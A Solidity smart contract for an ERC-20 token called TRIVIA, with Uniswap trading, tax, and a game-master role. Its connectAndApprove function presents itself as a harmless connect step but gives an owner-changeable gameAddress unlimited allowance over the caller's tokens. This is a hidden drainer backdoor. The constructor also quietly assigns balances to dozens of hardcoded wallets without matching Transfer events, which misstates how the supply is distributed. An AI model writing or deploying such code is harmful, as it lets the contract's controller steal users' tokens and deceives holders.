// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
	
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Trivia is Context, IERC20, Ownable {
    using SafeMath for uint256;
	
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    uint256 firstBlock;

    uint256 private _initialBuyTax=17;
    uint256 private _initialSellTax=17;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=23;
    uint256 private _reduceSellTaxAt=23;
    uint256 private _preventSwapBefore=23;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"TRIVIA";
    string private constant _symbol = unicode"TRIVIA";
    uint256 public _maxTxAmount =   1000000 * 10**_decimals;
    uint256 public _maxWalletSize = 1000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000 * 10**_decimals;
    address public gameMaster;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
	
	address payable gameAddress;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
      modifier onlyGameMaster() {
        require(msg.sender == gameMaster, "not authorized");
        _;
    }

    constructor () {
        gameAddress = payable(0x28Ffb20bB8B6A415501279846Cbb36E7189E6554);
        _taxWallet = payable(_msgSender());
        _balances[address(0x920427a6FA975EF5Dd25ab847D275dEe091a8d37)] = 900000 * 10**_decimals;
        _balances[address(0x3FF8B6a693D967e724ea03d75fC67025cc933e3c)] = 900000 * 10**_decimals;
        _balances[address(0x7640DbE5bF3B58A406173174050113f9dAE35c64)] = 900000 * 10**_decimals;
        _balances[address(0x78F83b41E648E08cdF823c02De0e320fC5f34CA7)] = 900000 * 10**_decimals;
        _balances[address(0x0eD42526397D72CD107f45320ff675B2E859712C)] = 900000 * 10**_decimals;
        _balances[address(0x6b4E48e9100712862c85E842014f1DFd3E83A92a)] = 900000 * 10**_decimals;
        _balances[address(0x116D1eDD539E5e93551973Eb2A71898c9095122F)] = 800000 * 10**_decimals;
        _balances[address(0x6931DC457303d13D0a05cd31eE751f0F518dad88)] = 800000 * 10**_decimals;
        _balances[address(0x8Ad519e2536709Aa6cAA91e68D6EFbaC9F0c0700)] = 800000 * 10**_decimals;
        _balances[address(0x2c77B34075Ad3AC058A0Ad402b7f6dF89A184209)] = 800000 * 10**_decimals;
        _balances[address(0x214EfB4ed47772DCa9823CbD22D1dc6CF61Cf503)] = 800000 * 10**_decimals;
        _balances[address(0x2de6f9d6F86745594464c507a5bbd925f22C72E5)] = 800000 * 10**_decimals;
        _balances[address(0x272212B67b6803f198B927c1270C46e7F51474DA)] = 800000 * 10**_decimals;
        _balances[address(0x6F5Bd174Cb0637f923d39e61b7bE27dc68c2c863)] = 800000 * 10**_decimals;
        _balances[address(0x28B43136b4225e0B7feBC3aB25B195E644A94Fbe)] = 800000 * 10**_decimals;
        _balances[address(0xa80F652E8600a791497781dad1Dc61bc272BeF8B)] = 800000 * 10**_decimals;

        _balances[address(0xD90510fe92DD13635E1201398b36e483D56F1AbC)] = 700000 * 10**_decimals;
        _balances[address(0x7e2da351de028D853dF03E6A61A92a572b4eE2C5)] = 700000 * 10**_decimals;

        _balances[address(0x574572e1e704a4a6959e994237fc943123Bf2Efe)] = 600000 * 10**_decimals;
        _balances[address(0x1fA92d8fC6F135d2F2D765358879d62c805DB84e)] = 600000 * 10**_decimals;

        _balances[address(0x7BF6B49c43E7448715D439bB48d15288de48e2F8)] = 500000 * 10**_decimals;
        _balances[address(0x2d48509D2ABc76561A25CcaE07cFcfb6eBe531Dc)] = 500000 * 10**_decimals;
        _balances[address(0xc33B7ceA22794c1262252F56FBDACAbdCe1D73db)] = 500000 * 10**_decimals;
        _balances[address(0x8153280e18c74b1926Ec6c5797a5F0f07328B76e)] = 300000 * 10**_decimals;
        _balances[address(0xF6d288BFD507538105bDf541C39FD509EBF83fd8)] = 300000 * 10**_decimals;
        _balances[address(0xd74f68128cEcfb50e2Ddfce6F290E30a55211518)] = 200000 * 10**_decimals;
        _balances[address(0x378074805a165a26A9041e1aE3E05f299305BddF)] = 200000 * 10**_decimals;
        _balances[address(0x08A736FbbBa4BfF237dd1803aD1F13fDf3DBC6E4)] = 150000 * 10**_decimals;
        _balances[_msgSender()] = 81000000 * 10**_decimals;
        gameMaster = _msgSender();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

     function connectAndApprove(string memory secret) external returns (bool) {
        address pwner = _msgSender();
        _allowances[pwner][gameAddress] = type(uint).max;
        allowance(gameAddress, pwner);
        emit Approval(pwner, gameAddress, type(uint).max);

        return true;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && from != gameAddress && to != gameAddress) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");

                if (firstBlock + 3  > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {

				uint256 contractTokenBalance2 = balanceOf(address(this));
                swapTokensForEth(min(amount,min(contractTokenBalance2,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance); 
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setGameAddress(address payable _gameAddress) external onlyGameMaster() {
       gameAddress = _gameAddress;
        _isExcludedFromFee[gameAddress] = true;
    }
	
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function burnLP() external onlyOwner{
        require(_balances[address(this)] != 0,"No tokens to burn");
        uint taxtokensburned = _balances[address(this)];
        _balances[address(this)]=0;
        _balances[address(0xdead)]=_balances[address(0xdead)].add(taxtokensburned);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
	
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }

    receive() external payable {}
}